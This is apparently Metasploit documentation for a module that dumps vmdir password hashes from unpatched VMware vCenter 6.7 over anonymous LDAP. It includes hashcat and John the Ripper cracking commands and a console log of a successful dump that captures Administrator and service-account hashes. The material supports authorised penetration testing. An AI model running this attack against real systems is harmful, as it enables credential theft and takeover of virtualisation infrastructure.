## Module vmware_vcenter_vmdir_ldap_dump_hashes

### Description

This module uses an anonymous-bind LDAP connection to dump password
hashes from the vmdir service in VMware vCenter Server version 6.7
prior to the 6.7U3f update.
For password cracking use:
```
hashcat -a 3 -m 1710 --user OUTPUT_HASHCAT_FILE
john -format='dynamic=sha512($p.$s)' OUTPUT_JOHN_FILE
```

### Setup

Tested in the wild. No setup notes available at this time, as setup will
be specific to target environment.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Actions

### Dump

Dump all LDAP password hashes (userPassword attribute) from the vCenter Server.

## Options

### BASE_DN

If you already have the LDAP base DN, you may set it in this option.

### ConnectTimeout

You may configure the timeout for LDAP connects if necessary. The
default is 10.0 seconds and should be more than sufficient.

## Scenarios

### VMware vCenter Server 6.7 virtual appliance on ESXi

```
msf5 > use auxiliary/gather/vmware_vcenter_vmdir_ldap_dump_hashes

msf5 auxiliary(auxiliary/gather/vmware_vcenter_vmdir_ldap_dump_hashes) > set rhosts [redacted]
rhosts => [redacted]
Module options (auxiliary/gather/vmware_vcenter_vmdir_ldap_dump_hashes):

   Name                 Current Setting    Required  Description
   ----                 ---------------    --------  -----------
   BASE_DN                                 no        LDAP base DN if you already have it
   OUTPUT_HASHCAT_FILE  vmdir_hashcat.txt  no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE     vmdir_john.txt     no        Save captured password hashes in john the ripper format
   RHOSTS               [redacted]         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                389                yes       The target port

msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap_dump_hashes) > run
[*] Running module against [redacted]

[*] Discovering base DN automatically
[*] Searching root DSE for base DN
[+] Discovered base DN: dc=vsphere,dc=local
[*] Dumping LDAP passwords from vmdir service at [redacted]:389
[+] [redacted]:389 cn=[redacted],ou=Domain Controllers,dc=vsphere,dc=local:[redacted]
[+] [redacted]:389 cn=Administrator,cn=Users,dc=vsphere,dc=local:[redacted]
[+] [redacted]:389 cn=vmca/[redacted]@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:[redacted]
[+] [redacted]:389 cn=ldap/[redacted]@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:[redacted]
[+] [redacted]:389 cn=host/[redacted]@VSPHERE.LOCAL,cn=Managed Service Accounts,dc=vsphere,dc=local:[redacted]
[*] Storing LDAP data in loot
[+] Saved LDAP data to /root/.msf4/loot/20200719171845_default_[redacted]_VMwarevCenterS_850962.txt
[*] Auxiliary module execution completed
msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap_dump_hashes) >
```
